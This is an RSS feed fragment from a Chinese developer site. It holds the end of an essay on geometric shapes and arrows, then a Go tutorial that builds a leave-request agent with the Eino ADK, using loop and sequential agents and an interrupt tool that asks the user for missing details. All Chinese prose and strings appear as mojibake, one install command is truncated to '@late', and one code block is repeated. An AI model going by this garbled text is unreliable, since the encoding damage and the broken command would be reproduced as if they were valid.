<li><strong>æ†éƒ¨ï¼ˆShaftï¼‰</strong> ï¼šé€šå¸¸ä¸ºç›´çº¿æˆ–å¸¦çŠ¶ï¼Œè¡¨ç¤ºè·¯å¾„æˆ–ä¸»è½´ã€‚</li>
<li><strong>ç®­å¤´å¤´ï¼ˆHeadï¼‰</strong> ï¼šå¤šä¸ºä¸‰è§’å½¢æˆ–é”¥å½¢ï¼Œå¼ºè°ƒæ–¹å‘ç»ˆç‚¹ã€‚</li>
<li>æœ‰æ—¶åŒ…å«<strong>å°¾ç¾½</strong>ï¼ˆå¦‚å¼“ç®­æ ·å¼ï¼‰ï¼Œå¢å¼ºè§†è§‰è¯†åˆ«ã€‚</li>
</ul>
<h3 data-id="heading-22">ç±»å‹ä¸ç”¨é€”</h3>
<ul>
<li><strong>å•å‘ç®­å¤´</strong>ï¼šâ†’ è¡¨ç¤ºå•ä¸€æ–¹å‘ï¼ˆå¦‚æµç¨‹å›¾ã€è·¯æ ‡ï¼‰</li>
<li><strong>åŒå‘ç®­å¤´</strong>ï¼šâ†” è¡¨ç¤ºå¾€è¿”æˆ–å¯¹ç­‰å…³ç³»</li>
<li><strong>å¼¯æ›²ç®­å¤´</strong>ï¼šâ†· è¡¨ç¤ºæ—‹è½¬ã€å¾ªç¯æˆ–éçº¿æ€§è¿‡ç¨‹</li>
<li><strong>ç²—/ç»†ç®­å¤´</strong>ï¼šè¡¨ç¤ºå¼ºåº¦ã€ä¼˜å…ˆçº§æˆ–æ•°æ®æµå¤§å°</li>
</ul>
<h3 data-id="heading-23">è®¾è®¡åŸåˆ™</h3>
<ul>
<li><strong>æ¸…æ™°æ€§</strong>ï¼šæ–¹å‘å¿…é¡»ä¸€ç›®äº†ç„¶</li>
<li><strong>æ¯”ä¾‹åè°ƒ</strong>ï¼šç®­å¤´å¤´ä¸å®œè¿‡å¤§æˆ–è¿‡å°</li>
<li><strong>ä¸Šä¸‹æ–‡é€‚é…</strong>ï¼šåœ¨UIè®¾è®¡ã€äº¤é€šæ ‡å¿—ã€æ•°å­¦ç¬¦å·ä¸­é£æ ¼å„å¼‚</li>
</ul>
<h3 data-id="heading-24">ä¸å…¶ä»–å›¾å½¢çš„è”ç³»</h3>
<ul>
<li>ç®­å¤´å¤´éƒ¨å¸¸é‡‡ç”¨<strong>ä¸‰è§’å½¢</strong>ï¼Œå› å…¶å°–é”æŒ‡å‘æ€§å¼ºã€‚</li>
<li>åœ¨çŸ¢é‡åœºä¸­ï¼Œç®­å¤´é•¿åº¦ä»£è¡¨<strong>å¤§å°</strong>ï¼Œæ–¹å‘ä»£è¡¨<strong>çŸ¢é‡æ–¹å‘</strong>ã€‚</li>
<li>åœ¨æ—¶é—´çº¿æˆ–æµç¨‹å›¾ä¸­ï¼Œç®­å¤´è¿æ¥<strong>åœ†å½¢</strong>ï¼ˆèŠ‚ç‚¹ï¼‰æˆ–<strong>æ¤­åœ†</strong>ï¼ˆçŠ¶æ€ï¼‰ï¼Œå½¢æˆä¿¡æ¯ç½‘ç»œã€‚</li>
</ul>
<p>ç®­å¤´æ ‡å¿—ç€ä»<strong>é™æ€å‡ ä½•</strong>å‘<strong>åŠ¨æ€è¯­ä¹‰</strong>çš„è·ƒè¿â€”â€”å®ƒä¸å†ä»…ä»…æè¿°â€œæ˜¯ä»€ä¹ˆâ€ï¼Œè€Œæ˜¯è¯´æ˜â€œå¾€å“ªé‡Œå»â€ã€‚</p>
<hr/>
<h2 data-id="heading-25">ğŸ”— å›¾å½¢æ¼”è¿›çš„é€»è¾‘è„‰ç»œ</h2>
<p>ä» ğŸ“ åˆ° ğŸ§­ï¼Œè¿™ä¸€åºåˆ—éšå«ç€äººç±»è®¤çŸ¥ä¸æŠ€æœ¯å‘å±•çš„æ·±å±‚é€»è¾‘ï¼š</p>
<ol>
<li><strong>æ„å»ºåŸºç¡€</strong>ï¼ˆä¸‰è§’å½¢ï¼‰ï¼šæœ€ç¨³å®šçš„ç»“æ„å•å…ƒï¼Œæ”¯æ’‘ç‰©ç†ä¸–ç•Œã€‚</li>
<li><strong>æ‰©å±•å½¢æ€</strong>ï¼ˆæ¢¯å½¢ï¼‰ï¼šå¼•å…¥ä¸å¯¹ç§°ä¸å®ç”¨æ€§ï¼Œé€‚åº”ç°å®éœ€æ±‚ã€‚</li>
<li><strong>å¼•å…¥æ›²çº¿</strong>ï¼ˆæ‰‡å½¢ï¼‰ï¼šä»ç›´çº¿åˆ°å¼§çº¿ï¼Œå¼€å¯è¿ç»­æ€§æ€ç»´ã€‚</li>
<li><strong>è¿½æ±‚å®Œç¾å¯¹ç§°</strong>ï¼ˆåœ†å½¢ï¼‰ï¼šç†æƒ³åŒ–çš„æé™å½¢å¼ï¼Œä½“ç°è‡ªç„¶æ³•åˆ™ã€‚</li>
<li><strong>æ‰“ç ´å¯¹ç§°ï¼Œæ‹¥æŠ±çœŸå®</strong>ï¼ˆæ¤­åœ†ï¼‰ï¼šæè¿°æ›´å¤æ‚çš„è‡ªç„¶ç°è±¡ï¼ˆå¦‚è½¨é“ï¼‰ã€‚</li>
<li><strong>è¶…è¶Šå½¢çŠ¶ï¼Œä¼ è¾¾æ„å›¾</strong>ï¼ˆç®­å¤´ï¼‰ï¼šå›¾å½¢æˆä¸ºä¿¡æ¯è½½ä½“ï¼ŒæœåŠ¡äºæ²Ÿé€šä¸æ§åˆ¶ã€‚</li>
</ol>
<p>è¿™ä¸€è·¯å¾„ä¸ä»…æ˜¯å‡ ä½•å¤æ‚åº¦çš„æå‡ï¼Œæ›´æ˜¯ä»<strong>å­˜åœ¨</strong>ï¼ˆbeingï¼‰åˆ°<strong>å˜åŒ–</strong>ï¼ˆbecomingï¼‰çš„å“²å­¦æ¼”è¿›ã€‚</p>
<hr/>
<h2 data-id="heading-26">ğŸ’ ç»“è¯­</h2>
<p>æ— è®ºæ˜¯ç”¨äºè®¡ç®—æ¡¥æ¢æ‰¿é‡çš„ä¸‰è§’å½¢ï¼Œè¿˜æ˜¯æŒ‡ç¤ºç½‘é¡µâ€œè¿”å›é¡¶éƒ¨â€çš„å°å°ç®­å¤´ï¼Œè¿™äº›å›¾å½¢æ—©å·²èå…¥äººç±»æ–‡æ˜çš„è‚Œç†ã€‚å®ƒä»¬æ—¢æ˜¯æ•°å­¦è¯­è¨€çš„å­—æ¯ï¼Œä¹Ÿæ˜¯å·¥ç¨‹è“å›¾çš„åƒç´ ï¼Œæ›´æ˜¯è§†è§‰ä¼ è¾¾çš„è¯æ±‡ã€‚ç†è§£å®ƒä»¬çš„å®šä¹‰ã€æ€§è´¨ä¸å…³è”ï¼Œä¸ä»…æœ‰åŠ©äºå­¦æœ¯ç ”ç©¶ï¼Œæ›´èƒ½æå‡æˆ‘ä»¬åœ¨æ•°å­—æ—¶ä»£è§£è¯»ä¸–ç•Œçš„èƒ½åŠ›ã€‚</p>
<p>æ­£å¦‚å¤å¸Œè…Šäººç”¨åœ†è§„ä¸ç›´å°ºæ¢ç´¢å®‡å®™ç§©åºï¼Œä»Šå¤©çš„æˆ‘ä»¬ï¼Œä¾ç„¶åœ¨è¿™äº›çœ‹ä¼¼ç®€å•çš„å›¾å½¢ä¸­ï¼Œå¯»æ‰¾ç»“æ„ã€ç¾æ„Ÿä¸çœŸç†çš„ç»Ÿä¸€ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[go Einoä½¿ç”¨ADKå¼€å‘agent]]></title>    <link>https://juejin.cn/post/7595142737514479643</link>    <guid>https://juejin.cn/post/7595142737514479643</guid>    <pubDate>2026-01-15T05:59:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595142737514479643" data-draft-id="7595115707161804841" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="go Einoä½¿ç”¨ADKå¼€å‘agent"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-15T05:59:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·3075009303793"/> <meta itemprop="url" content="https://juejin.cn/user/4453485090705453"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            go Einoä½¿ç”¨ADKå¼€å‘agent
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4453485090705453/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·3075009303793
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T05:59:43.000Z" title="Thu Jan 15 2026 05:59:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h5 data-id="heading-0">å¼€å‘ä¸€ä¸ªç®€å•çš„å¸®åŠ©è¯·å‡çš„agentï¼Œç”¨æˆ·é€šè¿‡è¾“å…¥è¯·å‡ä¿¡æ¯ï¼Œagentè‡ªåŠ¨å®Œæˆè¯·å‡ä¿¡æ¯è¡¥å……ï¼Œå‘èµ·è¯·å‡æµç¨‹</h5>
<p>1ã€å®‰è£…ä¾èµ–</p>
<pre><code class="hljs language-shell" lang="shell">go get -u github.com/cloudwego/eino@latest
go get -u github.com/cloudwego/eino-ext/components/model/openai@late
</code></pre>
<p>2ã€æ–°å»ºä¸€ä¸ªå¾ªç¯agentï¼Œç”¨äºåˆ¤æ–­ç”¨æˆ·è¾“å…¥çš„è¯·å‡ä¿¡æ¯æ˜¯å¦å®Œæ•´ï¼Œå¦‚æœä¸å®Œæ•´ï¼Œè¯¢é—®ç”¨æˆ·è¾“å…¥ç›¸å…³çš„ä¿¡æ¯,æ ¸å¿ƒåœ¨äºåˆ›å»ºä¸€ä¸ªå·¥å…·ï¼Œé€šè¿‡å·¥å…·ä¸­æ–­agentï¼Œè·å–é—®é¢˜ç”¨æˆ·çš„å›ç­”</p>
<pre><code class="hljs language-go" lang="go">inferTool, err := utils.InferTool(
    <span class="hljs-string">"askQuestions"</span>,
    <span class="hljs-string">"è¯¢é—®ç”¨æˆ·è¡¥å……ä¿¡æ¯"</span>,
    <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ctx context.Context, input InferToolInput)</span></span> (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) {
       interrupted, _, storedState := compose.GetInterruptState[<span class="hljs-type">string</span>](ctx)
       <span class="hljs-keyword">if</span> !interrupted {
          <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>, compose.StatefulInterrupt(ctx, input, input)
       }
       flow, data, t := compose.GetResumeContext[<span class="hljs-type">string</span>](ctx)
       <span class="hljs-keyword">if</span> !flow {
          <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>, compose.StatefulInterrupt(ctx, input, storedState)
       }
       fmt.Println(<span class="hljs-string">"###"</span>, t)
       <span class="hljs-keyword">if</span> !data || t == <span class="hljs-string">""</span> {
          <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>, fmt.Errorf(<span class="hljs-string">"tool resumed without a user answer"</span>)
       }

       <span class="hljs-keyword">return</span> t, <span class="hljs-literal">nil</span>
    })
<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
    <span class="hljs-built_in">panic</span>(err)
}
</code></pre>
<pre><code class="hljs language-go" lang="go">analysisAgent, _ := adk.NewChatModelAgent(context.Background(), &amp;adk.ChatModelAgentConfig{
       Name:        <span class="hljs-string">"leaveAnalysisAgent"</span>,
       Model:       chatModel,
       Description: <span class="hljs-string">"åˆ†æç¼ºå°‘è¯·å‡ä¿¡æ¯"</span>,
       Instruction: <span class="hljs-string">`ä½ æ˜¯ä¸€ä¸ªè¯·å‡æµç¨‹ä¿¡æ¯åˆ†æä¸“å®¶ï¼Œæ ¹æ®æä¾›çš„è¯·å‡ä¿¡æ¯ï¼Œåˆ†æä»¥ä¸‹è¯·å‡å…³é”®ä¿¡æ¯
1ã€è¯·å‡çš„å¼€å§‹å’Œç»“æŸæ—¶é—´
2ã€è¯·å‡çš„ç±»å‹
3ã€è¯·å‡çš„åŸå› 
å¦‚æœè¯·å‡çš„ä¿¡æ¯å·²ç»å®Œæ•´ï¼Œè¯·è¾“å…¥"EXIT:è¯·å‡ä¿¡æ¯å·²å®Œæ•´" æ¥ç»“æŸè¯·å‡ä¿¡æ¯è¡¥å……æµç¨‹
`</span>,
    })

    askAgent, err := adk.NewChatModelAgent(context.Background(), &amp;adk.ChatModelAgentConfig{
       Name:        <span class="hljs-string">"completeLeaveInfo"</span>,
       Model:       chatModel,
       Description: <span class="hljs-string">"æ ¹æ®åˆ†æç»“æœè¯¢é—®ç”¨æˆ·è¡¥å……è¯·å‡ä¿¡æ¯"</span>,
       Instruction: <span class="hljs-string">`æ ¹æ®å‰é¢çš„ä¿¡æ¯è¡¥å……é—®é¢˜ï¼Œä½¿ç”¨askQuestionså·¥å…·ï¼Œè¡¥å……è¯·å‡ä¿¡æ¯`</span>,
       ToolsConfig: adk.ToolsConfig{
          ToolsNodeConfig: compose.ToolsNodeConfig{
             Tools: []tool.BaseTool{
                inferTool,
             },
          },
       },
    })

    exitAgent, err := adk.NewChatModelAgent(context.Background(), &amp;adk.ChatModelAgentConfig{
       Name:        <span class="hljs-string">"exitController"</span>,
       Model:       chatModel,
       Description: <span class="hljs-string">"æ§åˆ¶ä¼˜åŒ–å¾ªç¯çš„é€€å‡º"</span>,
       Instruction: <span class="hljs-string">`æ£€æŸ¥å‰é¢çš„åˆ†æç»“æœï¼Œå¦‚æœè¯·å‡æµç¨‹ä¿¡æ¯åˆ†æä¸“å®¶è®¤ä¸ºè¯·å‡ä¿¡æ¯å·²ç»å®Œæ•´ï¼ˆåŒ…å«"EXIT"å…³é”®è¯ï¼‰ï¼Œ
åˆ™è¾“å‡º "TERMINATE" å¹¶ç”Ÿæˆé€€å‡ºåŠ¨ä½œæ¥ç»“æŸå¾ªç¯ã€‚å¦åˆ™ç»§ç»­ä¸‹ä¸€è½®ä¼˜åŒ–ã€‚`</span>,
    })

    agent, err := adk.NewLoopAgent(context.Background(), &amp;adk.LoopAgentConfig{
       Name:        <span class="hljs-string">"leaveLoop"</span>,
       Description: <span class="hljs-string">"è¯·å‡ä¿¡æ¯è¡¥å……å¾ªç¯ï¼šåˆ†æç¼ºå°‘è¯·å‡ä¿¡æ¯-&gt;è¯¢é—®ç”¨æˆ·è¡¥å……è¯·å‡ä¿¡æ¯-&gt;æ£€æŸ¥é€€å‡ºæ¡ä»¶"</span>,
       SubAgents: []adk.Agent{
          analysisAgent,
          askAgent,
          exitAgent,
       },
       MaxIterations: <span class="hljs-number">5</span>,
    })

    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
       <span class="hljs-built_in">panic</span>(err)
    }

    leaveApproveTool, err := utils.InferTool[LeaveInfo, <span class="hljs-type">string</span>](<span class="hljs-string">"leaveApproveTool"</span>, <span class="hljs-string">"å‘èµ·è¯·å‡æµç¨‹"</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ctx context.Context, input LeaveInfo)</span></span> (output <span class="hljs-type">string</span>, err <span class="hljs-type">error</span>) {
       log.Println(<span class="hljs-string">"å‘èµ·è¯·å‡å…¥å‚ï¼š"</span>, input)
       <span class="hljs-keyword">return</span> <span class="hljs-string">"success"</span>, err
    })

    modelAgent, err := adk.NewChatModelAgent(context.Background(), &amp;adk.ChatModelAgentConfig{
       Name:        <span class="hljs-string">"leaveApproveAgent"</span>,
       Model:       chatModel,
       Description: <span class="hljs-string">"å‘èµ·è¯·å‡æµç¨‹"</span>,
       Instruction: <span class="hljs-string">"æ ¹æ®å‰é¢çš„è¯·å‡ä¿¡æ¯ï¼Œä½¿ç”¨leaveApproveToolå‘èµ·è¯·å‡æµç¨‹"</span>,
       ToolsConfig: adk.ToolsConfig{
          ToolsNodeConfig: compose.ToolsNodeConfig{
             Tools: []tool.BaseTool{
                leaveApproveTool,
             },
          },
       },
    })
</code></pre>
<p>3ã€åˆ›å»ºä¸€ä¸ªè¯·å‡æµç¨‹å‘èµ·agentï¼Œè¯·å‡ä¿¡æ¯è¡¥å……å®Œæˆä¹‹åï¼Œå‘èµ·è¯·å‡æµç¨‹</p>
<pre><code class="hljs language-go" lang="go">leaveApproveTool, err := utils.InferTool[LeaveInfo, <span class="hljs-type">string</span>](<span class="hljs-string">"leaveApproveTool"</span>, <span class="hljs-string">"å‘èµ·è¯·å‡æµç¨‹"</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ctx context.Context, input LeaveInfo)</span></span> (output <span class="hljs-type">string</span>, err <span class="hljs-type">error</span>) {
    log.Println(<span class="hljs-string">"å‘èµ·è¯·å‡å…¥å‚ï¼š"</span>, input)
    <span class="hljs-keyword">return</span> <span class="hljs-string">"success"</span>, err
})

modelAgent, err := adk.NewChatModelAgent(context.Background(), &amp;adk.ChatModelAgentConfig{
    Name:        <span class="hljs-string">"leaveApproveAgent"</span>,
    Model:       chatModel,
    Description: <span class="hljs-string">"å‘èµ·è¯·å‡æµç¨‹"</span>,
    Instruction: <span class="hljs-string">"æ ¹æ®å‰é¢çš„è¯·å‡ä¿¡æ¯ï¼Œä½¿ç”¨leaveApproveToolå‘èµ·è¯·å‡æµç¨‹"</span>,
    ToolsConfig: adk.ToolsConfig{
       ToolsNodeConfig: compose.ToolsNodeConfig{
          Tools: []tool.BaseTool{
             leaveApproveTool,
          },
       },
    },
})
</code></pre>
<p>4ã€åˆ›å»ºé¡ºåºæµå°†æ•´ä¸ªæµç¨‹ä¸²è”èµ·æ¥ï¼Œè¿è¡ŒåŒæ—¶è¾“å…¥æˆ‘ä»¬çš„ä¿¡æ¯<code>å¸®æˆ‘ä»ä»Šå¤©èµ·è¯·ä¸¤å¤©å‡</code>,æŸ¥çœ‹æ‰“å°agentçš„æ€è€ƒè¿‡ç¨‹ä»¥åŠç»“æœ</p>
<pre><code class="hljs language-go" lang="go">sequentialAgent, err := adk.NewSequentialAgent(context.Background(), &amp;adk.SequentialAgentConfig{
       Name:        <span class="hljs-string">"leaveSequentialAgent"</span>,
       Description: <span class="hljs-string">"è¯·å‡å·¥ä½œæµ"</span>,
       SubAgents: []adk.Agent{
          agent,
          modelAgent,
       },
    })

    runner := adk.NewRunner(context.Background(), adk.RunnerConfig{
       Agent:           sequentialAgent,
       CheckPointStore: store.NewInMemoryStore(),
       EnableStreaming: <span class="hljs-literal">true</span>,
    })

    iter := runner.Query(context.Background(), <span class="hljs-string">"å¸®æˆ‘ä»ä»Šå¤©èµ·è¯·ä¸¤å¤©å‡"</span>, adk.WithCheckPointID(<span class="hljs-string">"deep-analysis-1"</span>))
    <span class="hljs-keyword">for</span> {
       lastEvent, interrupted := processEvents(iter)
       <span class="hljs-keyword">if</span> !interrupted {
          <span class="hljs-keyword">break</span>
       }

       interruptCtx := lastEvent.Action.Interrupted.InterruptContexts[<span class="hljs-number">0</span>]
       interruptID := interruptCtx.ID
       fmt.Println(interruptCtx.Info.(InferToolInput).Question)
       fmt.Println(<span class="hljs-string">"è¾“å…¥ä½ çš„ç­”æ¡ˆ"</span>)
       <span class="hljs-keyword">var</span> answer <span class="hljs-type">string</span>
       n, err := fmt.Scanln(&amp;answer)
       <span class="hljs-keyword">if</span> n != <span class="hljs-number">1</span> || err != <span class="hljs-literal">nil</span> {
          <span class="hljs-built_in">panic</span>(err)
       }
       iter, err = runner.ResumeWithParams(context.Background(), <span class="hljs-string">"deep-analysis-1"</span>, &amp;adk.ResumeParams{
          Targets: <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]any{
             interruptID: answer,
          },
       })
       <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
          <span class="hljs-built_in">panic</span>(err)
       }

    }

}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">processEvents</span><span class="hljs-params">(iter *adk.AsyncIterator[*adk.AgentEvent])</span></span> (*adk.AgentEvent, <span class="hljs-type">bool</span>) {
    <span class="hljs-keyword">var</span> lastEvent *adk.AgentEvent
    <span class="hljs-keyword">for</span> {
       event, ok := iter.Next()
       <span class="hljs-keyword">if</span> !ok {
          <span class="hljs-keyword">break</span>
       }
       <span class="hljs-keyword">if</span> event.Err != <span class="hljs-literal">nil</span> {
          log.Fatal(event.Err)
       }

       PrintContent(event)
       lastEvent = event
    }

    <span class="hljs-keyword">if</span> lastEvent == <span class="hljs-literal">nil</span> {
       <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">false</span>
    }
    <span class="hljs-keyword">if</span> lastEvent.Action != <span class="hljs-literal">nil</span> &amp;&amp; lastEvent.Action.Interrupted != <span class="hljs-literal">nil</span> {
       <span class="hljs-keyword">return</span> lastEvent, <span class="hljs-literal">true</span>
    }
    <span class="hljs-keyword">return</span> lastEvent, <span class="hljs-literal">false</span>
}
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">PrintContent</span><span class="hljs-params">(event *adk.AgentEvent)</span></span> {
    <span class="hljs-keyword">if</span> event.Output != <span class="hljs-literal">nil</span> &amp;&amp; event.Output.MessageOutput != <span class="hljs-literal">nil</span> {
       output := event.Output.MessageOutput
       <span class="hljs-keyword">if</span> output.IsStreaming {
          stream := output.MessageStream
          <span class="hljs-keyword">if</span> stream != <span class="hljs-literal">nil</span> {

             <span class="hljs-keyword">for</span> {
                chunk, err := stream.Recv()
                <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
                   <span class="hljs-keyword">if</span> err == io.EOF {
                      <span class="hljs-keyword">break</span>
                   }
                   fmt.Printf(<span class="hljs-string">"error: %v"</span>, err)
                   <span class="hljs-keyword">return</span>
                }
                <span class="hljs-keyword">if</span> chunk.ReasoningContent != <span class="hljs-string">""</span> {
                   fmt.Print(chunk.ReasoningContent)
                }
                <span class="hljs-keyword">if</span> chunk.Content != <span class="hljs-string">""</span> {
                   fmt.Print(chunk.Content)
                }

             }

          }

       } <span class="hljs-keyword">else</span> {
          message := output.Message
          <span class="hljs-keyword">if</span> message != <span class="hljs-literal">nil</span> {
             <span class="hljs-keyword">if</span> message.Content != <span class="hljs-string">""</span> {
                log.Print(message)
             }

             <span class="hljs-keyword">if</span> message.ReasoningContent != <span class="hljs-string">""</span> {
                fmt.Print(message.ReasoningContent)
             }

          }
       }

    }

    <span class="hljs-keyword">if</span> event.Action != <span class="hljs-literal">nil</span> {
       <span class="hljs-keyword">if</span> event.Action.TransferToAgent != <span class="hljs-literal">nil</span> {
          fmt.Printf(<span class="hljs-string">"\naction: transfer to %v"</span>, event.Action.TransferToAgent.DestAgentName)
       }

       <span class="hljs-keyword">if</span> event.Action.Interrupted != <span class="hljs-literal">nil</span> {
          <span class="hljs-keyword">for</span> _, ic := <span class="hljs-keyword">range</span> event.Action.Interrupted.InterruptContexts {
             str, ok := ic.Info.(fmt.Stringer)
             <span class="hljs-keyword">if</span> ok {
                fmt.Printf(<span class="hljs-string">"\n%s"</span>, str.String())
             } <span class="hljs-keyword">else</span> {
                fmt.Printf(<span class="hljs-string">"\n%v"</span>, ic.Info)
             }
          }
       }
       <span class="hljs-keyword">if</span> event.Action.Exit {
          fmt.Printf(<span class="hljs-string">"\naction: exit"</span>)
       }
    }

    <span class="hljs-keyword">if</span> event.Err != <span class="hljs-literal">nil</span> {
       fmt.Printf(<span class="hljs-string">"\nerror: %v"</span>, event.Err)
    }

}

<span class="hljs-keyword">type</span> InferToolInput <span class="hljs-keyword">struct</span> {
    Question <span class="hljs-type">string</span> <span class="hljs-string">`json:"question" jsonschema:"required;description=ä½ éœ€è¦è¯¢é—®çš„é—®é¢˜"`</span>
}

